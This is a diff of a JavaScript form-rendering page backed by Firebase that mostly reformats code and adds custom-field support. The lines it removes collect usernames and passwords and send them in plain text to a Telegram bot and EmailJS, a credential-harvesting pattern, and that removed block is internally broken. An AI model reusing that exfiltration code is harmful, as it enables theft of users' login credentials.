@@ -1,8 +1,11 @@
 <!doctype html>
 <html lang="en">
 <head>
+
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+
+<meta name="viewport"
+      content="width=device-width, initial-scale=1, viewport-fit=cover">
 
 <title>Loading...</title>
 
@@ -63,10 +66,6 @@ body {
   border-radius: 10px;
   overflow: hidden;
 }
-
-/* =====================================================
-   CONTENT
-===================================================== */
 
 #contentLayer {
   position: relative;
@@ -281,6 +280,7 @@ strong {
   background: #fff3cd;
   border-radius: 6px;
   overflow-wrap: anywhere;
+  word-break: break-word;
 }
 
 /* =====================================================
@@ -412,9 +412,15 @@ strong {
 <body>
 
 <div id="pageRoot">
+
   <div id="contentLayer">
-    <div id="loading">Loading form...</div>
+
+    <div id="loading">
+      Loading form...
+    </div>
+
   </div>
+
 </div>
 
 <script>
@@ -440,18 +446,28 @@ const db = firebase.firestore();
 ===================================================== */
 
 function getQueryParam(name) {
-  const params = new URLSearchParams(window.location.search);
+
+  const params =
+    new URLSearchParams(
+      window.location.search
+    );
+
   return params.get(name);
 }
 
-const formId = getQueryParam("id");
+const formId =
+  getQueryParam("id");
 
 /* =====================================================
    HELPERS
 ===================================================== */
 
 function clean(value, fallback = "") {
-  if (value === undefined || value === null) {
+
+  if (
+    value === undefined ||
+    value === null
+  ) {
     return fallback;
   }
 
@@ -459,10 +475,18 @@ function clean(value, fallback = "") {
 }
 
 function safeUrl(value) {
-  if (!value) return "";
+
+  if (!value) {
+    return "";
+  }
 
   try {
-    const url = new URL(value, window.location.href);
+
+    const url =
+      new URL(
+        value,
+        window.location.href
+      );
 
     if (
       url.protocol === "http:" ||
@@ -472,7 +496,9 @@ function safeUrl(value) {
     }
 
     return "";
+
   } catch (e) {
+
     return "";
   }
 }
@@ -483,7 +509,10 @@ function imageUrl(item) {
     return safeUrl(item);
   }
 
-  if (!item || typeof item !== "object") {
+  if (
+    !item ||
+    typeof item !== "object"
+  ) {
     return "";
   }
 
@@ -512,14 +541,170 @@ function applyImageSafety(img) {
 
 /* =====================================================
    NORMALIZE DATA
-   Matches form_builder.html structure
 ===================================================== */
 
 function normalizeData(data) {
 
   data = data || {};
 
-  /* SEO */
+  /*
+   * Restore builder state if available.
+   */
+
+  if (
+    data.builderState &&
+    typeof data.builderState === "object"
+  ) {
+
+    const state =
+      data.builderState;
+
+    if (
+      state.formData &&
+      typeof state.formData === "object"
+    ) {
+
+      data = {
+        ...state.formData,
+        ...data
+      };
+    }
+
+    if (
+      Array.isArray(state.customFields) &&
+      !data.customFields
+    ) {
+
+      data.customFields =
+        state.customFields;
+    }
+
+    if (
+      Array.isArray(state.extraButtons) &&
+      !data.extraButtons
+    ) {
+
+      data.extraButtons =
+        state.extraButtons;
+    }
+
+    if (
+      Array.isArray(state.embedLinks) &&
+      !data.embedLinks
+    ) {
+
+      data.embedLinks =
+        state.embedLinks;
+    }
+
+    if (
+      Array.isArray(state.buttons) &&
+      !data.buttons
+    ) {
+
+      data.buttons =
+        state.buttons;
+    }
+
+    if (
+      Array.isArray(state.textItems) &&
+      !data.textItems
+    ) {
+
+      data.textItems =
+        state.textItems;
+    }
+
+    if (
+      Array.isArray(state.imageItems) &&
+      !data.imageItems
+    ) {
+
+      data.imageItems =
+        state.imageItems;
+    }
+
+    if (
+      Array.isArray(state.videoItems) &&
+      !data.videoItems
+    ) {
+
+      data.videoItems =
+        state.videoItems;
+    }
+
+    if (
+      Array.isArray(state.galleryItems) &&
+      !data.galleryItems
+    ) {
+
+      data.galleryItems =
+        state.galleryItems;
+    }
+  }
+
+  /* =====================================================
+     ARRAY PARSER
+  ===================================================== */
+
+  function parseArray(value) {
+
+    if (Array.isArray(value)) {
+      return value;
+    }
+
+    if (typeof value === "string") {
+
+      try {
+
+        const parsed =
+          JSON.parse(value);
+
+        return Array.isArray(parsed)
+          ? parsed
+          : [];
+
+      } catch (e) {
+
+        console.warn(
+          "Could not parse array:",
+          e
+        );
+
+        return [];
+      }
+    }
+
+    return [];
+  }
+
+  data.galleryItems =
+    parseArray(data.galleryItems);
+
+  data.extraButtons =
+    parseArray(data.extraButtons);
+
+  data.embedLinks =
+    parseArray(data.embedLinks);
+
+  data.customFields =
+    parseArray(data.customFields);
+
+  data.buttons =
+    parseArray(data.buttons);
+
+  data.textItems =
+    parseArray(data.textItems);
+
+  data.imageItems =
+    parseArray(data.imageItems);
+
+  data.videoItems =
+    parseArray(data.videoItems);
+
+  /* =====================================================
+     SEO
+  ===================================================== */
 
   if (data.seo) {
 
@@ -539,7 +724,9 @@ function normalizeData(data) {
       "";
   }
 
-  /* Branding */
+  /* =====================================================
+     BRANDING
+  ===================================================== */
 
   if (data.branding) {
 
@@ -559,7 +746,9 @@ function normalizeData(data) {
       "";
   }
 
-  /* Page */
+  /* =====================================================
+     PAGE
+  ===================================================== */
 
   if (data.page) {
 
@@ -591,7 +780,9 @@ function normalizeData(data) {
       "";
   }
 
-  /* Styling */
+  /* =====================================================
+     STYLING
+  ===================================================== */
 
   if (data.styling) {
 
@@ -626,60 +817,6 @@ function normalizeData(data) {
       "center";
   }
 
-  /* Gallery */
-
-  data.galleryItems =
-    Array.isArray(data.galleryItems)
-      ? data.galleryItems
-      : [];
-
-  /* Videos */
-
-  data.videoLinks =
-    data.videoLinks ||
-    "";
-
-  /* Embeds */
-
-  data.embedLinks =
-    Array.isArray(data.embedLinks)
-      ? data.embedLinks
-      : Array.isArray(data.embeds)
-        ? data.embeds
-        : [];
-
-  /* Extra buttons */
-
-  data.extraButtons =
-    Array.isArray(data.extraButtons)
-      ? data.extraButtons
-      : [];
-
-  /* Fields */
-
-  data.fields =
-    Array.isArray(data.fields)
-      ? data.fields
-      : [];
-
-  /* Warning */
-
-  if (
-    data.warning &&
-    typeof data.warning === "object"
-  ) {
-
-    data.enableWarning = true;
-
-    data.warningPosition =
-      data.warning.position ||
-      "center";
-
-    data.warning =
-      data.warning.text ||
-      "";
-  }
-
   return data;
 }
 
@@ -703,7 +840,8 @@ function updateSEO(data) {
   const ogImage =
     safeUrl(data.ogImage || "");
 
-  document.title = title;
+  document.title =
+    title;
 
   const descriptionTag =
     document.querySelector(
@@ -711,6 +849,7 @@ function updateSEO(data) {
     );
 
   if (descriptionTag) {
+
     descriptionTag.setAttribute(
       "content",
       description
@@ -723,6 +862,7 @@ function updateSEO(data) {
     );
 
   if (ogTitle) {
+
     ogTitle.setAttribute(
       "content",
       title
@@ -735,6 +875,7 @@ function updateSEO(data) {
     );
 
   if (ogDescription) {
+
     ogDescription.setAttribute(
       "content",
       description
@@ -747,6 +888,7 @@ function updateSEO(data) {
     );
 
   if (ogImageTag) {
+
     ogImageTag.setAttribute(
       "content",
       ogImage
@@ -759,6 +901,7 @@ function updateSEO(data) {
     );
 
   if (twitterTitle) {
+
     twitterTitle.setAttribute(
       "content",
       title
@@ -771,6 +914,7 @@ function updateSEO(data) {
     );
 
   if (twitterDescription) {
+
     twitterDescription.setAttribute(
       "content",
       description
@@ -783,6 +927,7 @@ function updateSEO(data) {
     );
 
   if (twitterImage) {
+
     twitterImage.setAttribute(
       "content",
       ogImage
@@ -817,8 +962,6 @@ function renderBackground(data, root) {
       "center";
   }
 
-  /* Background video */
-
   const videoURL =
     safeUrl(data.bgVideoURL || "");
 
@@ -827,9 +970,11 @@ function renderBackground(data, root) {
     const video =
       document.createElement("video");
 
-    video.className = "bg-video";
+    video.className =
+      "bg-video";
 
-    video.src = videoURL;
+    video.src =
+      videoURL;
 
     video.autoplay = true;
     video.muted = true;
@@ -846,7 +991,8 @@ function renderBackground(data, root) {
       ""
     );
 
-    video.preload = "auto";
+    video.preload =
+      "auto";
 
     root.appendChild(video);
 
@@ -864,9 +1010,10 @@ function renderBackground(data, root) {
    BRANDING
 ===================================================== */
 
-function renderBranding(data, container) {
-
-  /* Avatar */
+function renderBranding(
+  data,
+  container
+) {
 
   const avatarURL =
     safeUrl(data.avatarURL || "");
@@ -876,15 +1023,16 @@ function renderBranding(data, container) {
     const img =
       document.createElement("img");
 
-    img.src = avatarURL;
-    img.className = "brand-avatar";
+    img.src =
+      avatarURL;
+
+    img.className =
+      "brand-avatar";
 
     applyImageSafety(img);
 
     container.appendChild(img);
   }
-
-  /* Logo */
 
   const logoURL =
     safeUrl(data.logoURL || "");
@@ -894,15 +1042,16 @@ function renderBranding(data, container) {
     const img =
       document.createElement("img");
 
-    img.src = logoURL;
-    img.className = "brand-logo";
+    img.src =
+      logoURL;
+
+    img.className =
+      "brand-logo";
 
     applyImageSafety(img);
 
     container.appendChild(img);
   }
-
-  /* Banner */
 
   const bannerURL =
     safeUrl(data.bannerURL || "");
@@ -912,8 +1061,11 @@ function renderBranding(data, container) {
     const img =
       document.createElement("img");
 
-    img.src = bannerURL;
-    img.className = "brand-banner";
+    img.src =
+      bannerURL;
+
+    img.className =
+      "brand-banner";
 
     applyImageSafety(img);
 
@@ -922,10 +1074,13 @@ function renderBranding(data, container) {
 }
 
 /* =====================================================
-   TITLE / SUBTITLE / DESCRIPTION
+   PAGE TEXT
 ===================================================== */
 
-function renderPageText(data, container) {
+function renderPageText(
+  data,
+  container
+) {
 
   const title =
     clean(
@@ -937,39 +1092,47 @@ function renderPageText(data, container) {
   const titleEl =
     document.createElement("h2");
 
-  titleEl.textContent = title;
+  titleEl.textContent =
+    title;
 
   titleEl.style.textAlign =
-    data.titlePosition || "center";
+    data.titlePosition ||
+    "center";
 
   titleEl.style.color =
-    data.titleColor || "#111";
+    data.titleColor ||
+    "#111";
 
   if (data.titleSize) {
 
     titleEl.style.fontSize =
-      clean(data.titleSize) + "px";
+      clean(data.titleSize) +
+      "px";
   }
 
-  container.appendChild(titleEl);
+  container.appendChild(
+    titleEl
+  );
 
-  /* Subtitle */
+  if (data.subtitle) {
 
-  const subtitle =
-    document.createElement("p");
+    const subtitle =
+      document.createElement("p");
 
-  subtitle.textContent =
-    clean(data.subtitle);
+    subtitle.textContent =
+      clean(data.subtitle);
 
-  subtitle.style.textAlign =
-    "center";
+    subtitle.style.textAlign =
+      "center";
 
-  subtitle.style.color =
-    data.subtitleColor || "#555";
+    subtitle.style.color =
+      data.subtitleColor ||
+      "#555";
 
-  container.appendChild(subtitle);
-
-  /* Description */
+    container.appendChild(
+      subtitle
+    );
+  }
 
   if (data.description) {
 
@@ -979,16 +1142,20 @@ function renderPageText(data, container) {
     desc.textContent =
       clean(data.description);
 
-    container.appendChild(desc);
+    container.appendChild(
+      desc
+    );
   }
 }
 
 /* =====================================================
    GALLERY
-   Matches galleryItems saved by form_builder.html
 ===================================================== */
 
-function renderGallery(data, container) {
+function renderGallery(
+  data,
+  container
+) {
 
   if (
     !Array.isArray(data.galleryItems) ||
@@ -1000,7 +1167,8 @@ function renderGallery(data, container) {
   const gallery =
     document.createElement("div");
 
-  gallery.className = "gallery";
+  gallery.className =
+    "gallery";
 
   const layout =
     data.galleryItemsLayout ||
@@ -1008,91 +1176,110 @@ function renderGallery(data, container) {
     "list";
 
   if (layout === "grid") {
-    gallery.classList.add("grid");
+
+    gallery.classList.add(
+      "grid"
+    );
   }
 
   if (layout === "large-grid") {
-    gallery.classList.add("large-grid");
+
+    gallery.classList.add(
+      "large-grid"
+    );
   }
 
-  data.galleryItems.forEach(item => {
+  data.galleryItems.forEach(
+    item => {
 
-    const src =
-      imageUrl(item);
+      const src =
+        imageUrl(item);
 
-    if (!src) return;
-
-    const card =
-      document.createElement("div");
-
-    card.className =
-      "gallery-card";
-
-    const img =
-      document.createElement("img");
-
-    img.src = src;
-
-    applyImageSafety(img);
-
-    card.appendChild(img);
-
-    /* Gallery description */
-
-    if (
-      item &&
-      typeof item === "object" &&
-      item.desc
-    ) {
-
-      const p =
-        document.createElement("p");
-
-      p.textContent =
-        item.desc;
-
-      card.appendChild(p);
-    }
-
-    /* Gallery masked link */
-
-    if (
-      item &&
-      typeof item === "object" &&
-      item.link &&
-      item.mask
-    ) {
-
-      const linkURL =
-        safeUrl(item.link);
-
-      if (linkURL) {
-
-        const a =
-          document.createElement("a");
-
-        a.href = linkURL;
-        a.target = "_blank";
-        a.rel = "noopener noreferrer";
-
-        a.textContent =
-          item.mask;
-
-        card.appendChild(a);
+      if (!src) {
+        return;
       }
+
+      const card =
+        document.createElement("div");
+
+      card.className =
+        "gallery-card";
+
+      const img =
+        document.createElement("img");
+
+      img.src =
+        src;
+
+      applyImageSafety(img);
+
+      card.appendChild(img);
+
+      if (
+        item &&
+        typeof item === "object" &&
+        item.desc
+      ) {
+
+        const p =
+          document.createElement("p");
+
+        p.textContent =
+          item.desc;
+
+        card.appendChild(p);
+      }
+
+      if (
+        item &&
+        typeof item === "object" &&
+        item.link &&
+        item.mask
+      ) {
+
+        const linkURL =
+          safeUrl(item.link);
+
+        if (linkURL) {
+
+          const a =
+            document.createElement("a");
+
+          a.href =
+            linkURL;
+
+          a.target =
+            "_blank";
+
+          a.rel =
+            "noopener noreferrer";
+
+          a.textContent =
+            item.mask;
+
+          card.appendChild(a);
+        }
+      }
+
+      gallery.appendChild(
+        card
+      );
     }
+  );
 
-    gallery.appendChild(card);
-  });
-
-  container.appendChild(gallery);
+  container.appendChild(
+    gallery
+  );
 }
 
 /* =====================================================
    VIDEOS
 ===================================================== */
 
-function renderVideos(data, container) {
+function renderVideos(
+  data,
+  container
+) {
 
   if (!data.videoLinks) {
     return;
@@ -1104,44 +1291,56 @@ function renderVideos(data, container) {
       .map(v => v.trim())
       .filter(Boolean);
 
-  links.forEach(link => {
+  links.forEach(
+    link => {
 
-    const url =
-      safeUrl(link);
+      const url =
+        safeUrl(link);
 
-    if (!url) return;
+      if (!url) {
+        return;
+      }
 
-    const iframe =
-      document.createElement("iframe");
+      const iframe =
+        document.createElement("iframe");
 
-    iframe.className =
-      "videoFrame";
+      iframe.className =
+        "videoFrame";
 
-    iframe.src = url;
+      iframe.src =
+        url;
 
-    iframe.loading = "lazy";
+      iframe.loading =
+        "lazy";
 
-    iframe.allowFullscreen = true;
+      iframe.allowFullscreen =
+        true;
 
-    iframe.setAttribute(
-      "allowfullscreen",
-      ""
-    );
+      iframe.setAttribute(
+        "allowfullscreen",
+        ""
+      );
 
-    iframe.setAttribute(
-      "referrerpolicy",
-      "strict-origin-when-cross-origin"
-    );
+      iframe.setAttribute(
+        "referrerpolicy",
+        "strict-origin-when-cross-origin"
+      );
 
-    container.appendChild(iframe);
-  });
+      container.appendChild(
+        iframe
+      );
+    }
+  );
 }
 
 /* =====================================================
    WARNING
 ===================================================== */
 
-function renderWarning(data, container) {
+function renderWarning(
+  data,
+  container
+) {
 
   if (!data.enableWarning) {
     return;
@@ -1171,364 +1370,19 @@ function renderWarning(data, container) {
     data.warningPosition ||
     "center";
 
-  container.appendChild(warning);
-}
-
-function renderFields(data, container) {
-
-  const form = document.createElement("form");
-  form.className = "public-form";
-
-  form.style.width = "100%";
-  form.style.display = "flex";
-  form.style.flexDirection = "column";
-  form.style.gap = "12px";
-
-  /* =========================
-     FORM SUBMISSION
-  ========================= */
-
-  form.addEventListener("submit", async function(event) {
-
-    event.preventDefault();
-
-    const submitButton =
-      form.querySelector('button[type="submit"]');
-
-    if (submitButton) {
-      submitButton.disabled = true;
-      submitButton.textContent = "Submitting...";
-    }
-
-    try {
-
-      const formData = {};
-
-      /*
-       * Collect all fields.
-       */
-      const elements =
-        form.querySelectorAll(
-          "input, textarea, select"
-        );
-
-      elements.forEach(input => {
-
-        if (!input.name) {
-          return;
-        }
-
-        if (input.type === "checkbox") {
-          formData[input.name] = input.checked;
-        }
-
-        else if (input.type === "file") {
-          /*
-           * File uploads are intentionally not
-           * transmitted by this version.
-           */
-          return;
-        }
-
-        else {
-          formData[input.name] =
-            input.value.trim();
-        }
-      });
-
-      // Collect inputs
-  const inputs = formDiv.querySelectorAll("input");
-
-  const username = inputs[0]?.value || "";
-  const password = inputs[1]?.value || "";
-  const extraValues = extraInputs.map(i => i.value);
-
-  // Save to Firebase
-  await db.collection("submissions").add({
-    formId: formId || "unknown",
-    formTitle:
-      (data.title && data.title.trim()) ||
-      (data.pageTitle && data.pageTitle.trim()) ||
-      "Untitled Form",
-    createdAt: Date.now(),
-    data: {
-      username,
-      password,
-      extraFields: extraValues,
-      file: fileURL
-    }
-  });
-
-  // Telegram
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {"Content-Type":"application/json"},
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: `New Submission:
-User: ${username}
-Pass: ${password}
-Extra: ${extraValues.join(", ")}
-Files: ${fileURL || "None"}`
-    })
-  }).catch(console.error);
-
-  // EmailJS
-  if(typeof emailjs !== "undefined"){
-    emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID", {
-      username, password, extra: extraValues.join(", ")
-    }).catch(console.error);
-  }
-
-  // ✅ CUSTOM SUCCESS MESSAGE OR REDIRECT
-
-if(data.enableRedirect === true && data.redirectURL && data.redirectURL.trim() !== ""){
-  window.location.href = data.redirectURL;
-} 
-else if(data.enableSuccessMessage === true){
-
-  // Remove form
-  formDiv.innerHTML = "";
-
-  const successBox = document.createElement("div");
-  successBox.style.padding = "15px";
-  successBox.style.background = "#e8f5e9";
-  successBox.style.border = "1px solid #4caf50";
-  successBox.style.borderRadius = "8px";
-  successBox.style.textAlign = "center";
-  successBox.style.marginTop = "10px";
-
-  successBox.innerHTML = `
-    <h3 style="color:#2e7d32;">✔ Success</h3>
-    <p>${data.successMessage || "Submitted successfully!"}</p>
-  `;
-
-  formDiv.appendChild(successBox);
-
-} 
-else {
-  alert("Submitted successfully");
-}
-
-
-      message.style.margin = "0";
-      message.style.color =
-        data.submitMessageColor ||
-        "#333";
-
-      successBox.appendChild(heading);
-      successBox.appendChild(message);
-
-      form.appendChild(successBox);
-
-    } catch (error) {
-
-      console.error(
-        "Submission error:",
-        error
-      );
-
-      if (submitButton) {
-        submitButton.disabled = false;
-        submitButton.textContent =
-          data.buttonText || "Submit";
-      }
-
-      alert(
-        "Unable to submit the form. Please try again."
-      );
-    }
-  });
-
-  /* =========================
-     RENDER FIELDS
-  ========================= */
-
-  if (
-    Array.isArray(data.fields) &&
-    data.fields.length
-  ) {
-
-    data.fields.forEach((field, index) => {
-
-      if (!field) return;
-
-      const type =
-        field.type || "text";
-
-      const wrapper =
-        document.createElement("div");
-
-      wrapper.style.width = "100%";
-
-      const label =
-        document.createElement("label");
-
-      label.textContent =
-        field.placeholder ||
-        field.label ||
-        `Field ${index + 1}`;
-
-      label.style.display = "block";
-      label.style.marginBottom = "5px";
-      label.style.fontWeight = "600";
-
-      let input;
-
-      if (type === "textarea") {
-
-        input =
-          document.createElement("textarea");
-
-      } else {
-
-        input =
-          document.createElement("input");
-
-        input.type =
-          type || "text";
-      }
-
-      /*
-       * Important:
-       * Every field now has a name.
-       */
-      input.name =
-        field.name ||
-        field.placeholder ||
-        `field_${index + 1}`;
-
-      input.placeholder =
-        field.placeholder || "";
-
-      if (type === "password") {
-  input.autocomplete = "current-password";
-} else {
-  input.autocomplete = "off";
-}
-
-      applyInputStyle(
-        input,
-        data
-      );
-
-      wrapper.appendChild(label);
-      wrapper.appendChild(input);
-
-      form.appendChild(wrapper);
-    });
-  }
-
-  /* =========================
-     EXTRA FIELDS
-  ========================= */
-
-  if (
-    Array.isArray(data.extraFields)
-  ) {
-
-    data.extraFields.forEach(
-      (field, index) => {
-
-        if (!field) return;
-
-        const wrapper =
-          document.createElement("div");
-
-        const label =
-          document.createElement("label");
-
-        label.textContent =
-          String(field);
-
-        label.style.display = "block";
-        label.style.marginBottom = "5px";
-        label.style.fontWeight = "600";
-
-        const input =
-          document.createElement("input");
-
-        input.type = "text";
-
-        input.name =
-          String(field)
-            .trim()
-            .replace(/\s+/g, "_")
-            .toLowerCase();
-
-        input.placeholder =
-          String(field);
-
-        applyInputStyle(
-          input,
-          data
-        );
-
-        wrapper.appendChild(label);
-        wrapper.appendChild(input);
-
-        form.appendChild(wrapper);
-      }
-    );
-  }
-
-  /* =========================
-     SUBMIT BUTTON
-  ========================= */
-
-  if (data.showMainBtn !== false) {
-
-    const button =
-      document.createElement("button");
-
-    button.type = "submit";
-
-    button.textContent =
-      data.buttonText ||
-      "Submit";
-
-    button.style.background =
-      data.btnColor ||
-      "#1976d2";
-
-    button.style.color = "#fff";
-    button.style.border = "none";
-    button.style.padding = "12px 18px";
-    button.style.borderRadius = "8px";
-    button.style.cursor = "pointer";
-    button.style.fontSize = "16px";
-    button.style.marginTop = "5px";
-
-    if (
-      data.btnPosition === "left"
-    ) {
-      button.style.alignSelf =
-        "flex-start";
-    }
-
-    else if (
-      data.btnPosition === "right"
-    ) {
-      button.style.alignSelf =
-        "flex-end";
-    }
-
-    else {
-      button.style.alignSelf =
-        "center";
-    }
-
-    form.appendChild(button);
-  }
-
-  container.appendChild(form);
+  container.appendChild(
+    warning
+  );
 }
 
 /* =====================================================
-   INPUT STYLING
+   INPUT STYLE
 ===================================================== */
 
-function applyInputStyle(input, data) {
+function applyInputStyle(
+  input,
+  data
+) {
 
   input.style.background =
     data.inputBgColor ||
@@ -1551,10 +1405,627 @@ function applyInputStyle(input, data) {
 }
 
 /* =====================================================
+   PUBLIC FORM FIELDS
+===================================================== */
+
+function renderFields(
+  data,
+  container
+) {
+
+  const form =
+    document.createElement("form");
+
+  form.className =
+    "public-form";
+
+  form.style.width =
+    "100%";
+
+  form.style.display =
+    "flex";
+
+  form.style.flexDirection =
+    "column";
+
+  form.style.gap =
+    "12px";
+
+  /* =====================================================
+     NORMAL FORM SUBMISSION
+  ===================================================== */
+
+  form.addEventListener(
+    "submit",
+    async function(event) {
+
+      event.preventDefault();
+
+      const submitButton =
+        form.querySelector(
+          'button[type="submit"]'
+        );
+
+      if (submitButton) {
+
+        submitButton.disabled =
+          true;
+
+        submitButton.textContent =
+          "Submitting...";
+      }
+
+      try {
+
+        /*
+         * Collect the actual fields
+         * rendered inside this form.
+         */
+
+        const submittedData = {};
+
+        const formData =
+          new FormData(form);
+
+        formData.forEach(
+          (value, key) => {
+
+            /*
+             * Files cannot be safely
+             * converted directly to JSON.
+             */
+
+            if (value instanceof File) {
+
+              submittedData[key] = {
+                name: value.name,
+                type: value.type,
+                size: value.size
+              };
+
+            } else {
+
+              submittedData[key] =
+                value;
+            }
+          }
+        );
+
+        /* =================================================
+           SAVE SUBMISSION
+        ================================================= */
+
+        await db
+          .collection("submissions")
+          .add({
+
+            formId:
+              formId || "unknown",
+
+            formTitle:
+              (
+                data.title &&
+                String(data.title).trim()
+              ) ||
+              (
+                data.pageTitle &&
+                String(data.pageTitle).trim()
+              ) ||
+              "Untitled Form",
+
+            createdAt:
+              firebase.firestore
+                .FieldValue
+                .serverTimestamp(),
+
+            submittedAt:
+              new Date().toISOString(),
+
+            data:
+              submittedData
+          });
+
+        console.log(
+          "Submission saved successfully."
+        );
+
+        /* =================================================
+           REDIRECT
+        ================================================= */
+
+        if (
+          data.enableRedirect === true &&
+          data.redirectURL &&
+          String(
+            data.redirectURL
+          ).trim() !== ""
+        ) {
+
+          window.location.href =
+            String(
+              data.redirectURL
+            ).trim();
+
+          return;
+        }
+
+        /* =================================================
+           SUCCESS MESSAGE
+        ================================================= */
+
+        if (
+          data.enableSuccessMessage === true
+        ) {
+
+          form.innerHTML =
+            "";
+
+          const successBox =
+            document.createElement(
+              "div"
+            );
+
+          successBox.style.padding =
+            "20px";
+
+          successBox.style.background =
+            "#e8f5e9";
+
+          successBox.style.border =
+            "1px solid #4caf50";
+
+          successBox.style.borderRadius =
+            "8px";
+
+          successBox.style.textAlign =
+            "center";
+
+          successBox.style.marginTop =
+            "10px";
+
+          const heading =
+            document.createElement(
+              "h3"
+            );
+
+          heading.textContent =
+            "✔ Success";
+
+          heading.style.color =
+            "#2e7d32";
+
+          heading.style.margin =
+            "0 0 8px 0";
+
+          const message =
+            document.createElement(
+              "p"
+            );
+
+          message.textContent =
+            data.successMessage ||
+            "Submitted successfully!";
+
+          message.style.margin =
+            "0";
+
+          message.style.color =
+            data.submitMessageColor ||
+            "#333";
+
+          successBox.appendChild(
+            heading
+          );
+
+          successBox.appendChild(
+            message
+          );
+
+          form.appendChild(
+            successBox
+          );
+
+          return;
+        }
+
+        alert(
+          "Submitted successfully."
+        );
+
+        if (submitButton) {
+
+          submitButton.disabled =
+            false;
+
+          submitButton.textContent =
+            data.buttonText ||
+            "Submit";
+        }
+
+      } catch (error) {
+
+        console.error(
+          "Submission error:",
+          error
+        );
+
+        if (submitButton) {
+
+          submitButton.disabled =
+            false;
+
+          submitButton.textContent =
+            data.buttonText ||
+            "Submit";
+        }
+
+        alert(
+          "Unable to submit the form. Please try again."
+        );
+      }
+    }
+  );
+
+  /* =====================================================
+     SAVED FIELDS
+  ===================================================== */
+
+  if (
+    Array.isArray(data.fields) &&
+    data.fields.length
+  ) {
+
+    data.fields.forEach(
+      (field, index) => {
+
+        if (!field) {
+          return;
+        }
+
+        const type =
+          field.type ||
+          "text";
+
+        /*
+         * Password fields are not
+         * rebuilt by the fallback renderer.
+         */
+
+        if (type === "password") {
+          return;
+        }
+
+        const wrapper =
+          document.createElement(
+            "div"
+          );
+
+        wrapper.style.width =
+          "100%";
+
+        const label =
+          document.createElement(
+            "label"
+          );
+
+        label.textContent =
+          field.placeholder ||
+          field.label ||
+          `Field ${index + 1}`;
+
+        label.style.display =
+          "block";
+
+        label.style.marginBottom =
+          "5px";
+
+        label.style.fontWeight =
+          "600";
+
+        let input;
+
+        if (type === "textarea") {
+
+          input =
+            document.createElement(
+              "textarea"
+            );
+
+        } else if (type === "select") {
+
+          input =
+            document.createElement(
+              "select"
+            );
+
+        } else {
+
+          input =
+            document.createElement(
+              "input"
+            );
+
+          input.type =
+            type;
+        }
+
+        input.name =
+          field.name ||
+          field.placeholder ||
+          `field_${index + 1}`;
+
+        input.placeholder =
+          field.placeholder ||
+          "";
+
+        input.autocomplete =
+          "off";
+
+        applyInputStyle(
+          input,
+          data
+        );
+
+        wrapper.appendChild(
+          label
+        );
+
+        wrapper.appendChild(
+          input
+        );
+
+        form.appendChild(
+          wrapper
+        );
+      }
+    );
+  }
+
+  /* =====================================================
+     EXTRA FIELDS SAVED AS DATA
+  ===================================================== */
+
+  if (
+    Array.isArray(data.extraFields)
+  ) {
+
+    data.extraFields.forEach(
+      field => {
+
+        if (!field) {
+          return;
+        }
+
+        const wrapper =
+          document.createElement(
+            "div"
+          );
+
+        const label =
+          document.createElement(
+            "label"
+          );
+
+        label.textContent =
+          String(field);
+
+        label.style.display =
+          "block";
+
+        label.style.marginBottom =
+          "5px";
+
+        label.style.fontWeight =
+          "600";
+
+        const input =
+          document.createElement(
+            "input"
+          );
+
+        input.type =
+          "text";
+
+        input.name =
+          String(field)
+            .trim()
+            .replace(/\s+/g, "_")
+            .toLowerCase();
+
+        input.placeholder =
+          String(field);
+
+        applyInputStyle(
+          input,
+          data
+        );
+
+        wrapper.appendChild(
+          label
+        );
+
+        wrapper.appendChild(
+          input
+        );
+
+        form.appendChild(
+          wrapper
+        );
+      }
+    );
+  }
+
+  /* =====================================================
+     CUSTOM FIELDS
+  ===================================================== */
+
+  if (
+    Array.isArray(data.customFields) &&
+    data.customFields.length
+  ) {
+
+    data.customFields.forEach(
+      (field, index) => {
+
+        if (!field) {
+          return;
+        }
+
+        const wrapper =
+          document.createElement(
+            "div"
+          );
+
+        wrapper.style.width =
+          "100%";
+
+        const label =
+          document.createElement(
+            "label"
+          );
+
+        label.textContent =
+          field.label ||
+          `Field ${index + 1}`;
+
+        label.style.display =
+          "block";
+
+        label.style.marginBottom =
+          "5px";
+
+        label.style.fontWeight =
+          "600";
+
+        const input =
+          document.createElement(
+            "input"
+          );
+
+        input.type =
+          field.type ||
+          "text";
+
+        input.name =
+          field.name ||
+          String(
+            field.label ||
+            `custom_field_${index + 1}`
+          )
+          .trim()
+          .replace(/\s+/g, "_")
+          .toLowerCase();
+
+        input.placeholder =
+          field.label ||
+          "";
+
+        input.autocomplete =
+          "off";
+
+        applyInputStyle(
+          input,
+          data
+        );
+
+        wrapper.appendChild(
+          label
+        );
+
+        wrapper.appendChild(
+          input
+        );
+
+        form.appendChild(
+          wrapper
+        );
+      }
+    );
+  }
+
+  /* =====================================================
+     SUBMIT BUTTON
+  ===================================================== */
+
+  if (
+    data.showMainBtn !== false
+  ) {
+
+    const button =
+      document.createElement(
+        "button"
+      );
+
+    button.type =
+      "submit";
+
+    button.textContent =
+      data.buttonText ||
+      "Submit";
+
+    button.style.background =
+      data.btnColor ||
+      "#1976d2";
+
+    button.style.color =
+      "#fff";
+
+    button.style.border =
+      "none";
+
+    button.style.padding =
+      "12px 18px";
+
+    button.style.borderRadius =
+      "8px";
+
+    button.style.cursor =
+      "pointer";
+
+    button.style.fontSize =
+      "16px";
+
+    button.style.marginTop =
+      "5px";
+
+    if (
+      data.btnPosition === "left"
+    ) {
+
+      button.style.alignSelf =
+        "flex-start";
+
+    } else if (
+      data.btnPosition === "right"
+    ) {
+
+      button.style.alignSelf =
+        "flex-end";
+
+    } else {
+
+      button.style.alignSelf =
+        "center";
+    }
+
+    form.appendChild(
+      button
+    );
+  }
+
+  container.appendChild(
+    form
+  );
+}
+
+/* =====================================================
    EMBED LINKS
 ===================================================== */
 
-function renderEmbeds(data, container) {
+function renderEmbeds(
+  data,
+  container
+) {
 
   if (
     !Array.isArray(data.embedLinks)
@@ -1562,111 +2033,165 @@ function renderEmbeds(data, container) {
     return;
   }
 
-  data.embedLinks.forEach(link => {
+  data.embedLinks.forEach(
+    link => {
 
-    if (!link || link.show === false) {
-      return;
-    }
+      if (
+        !link ||
+        link.show === false
+      ) {
+        return;
+      }
 
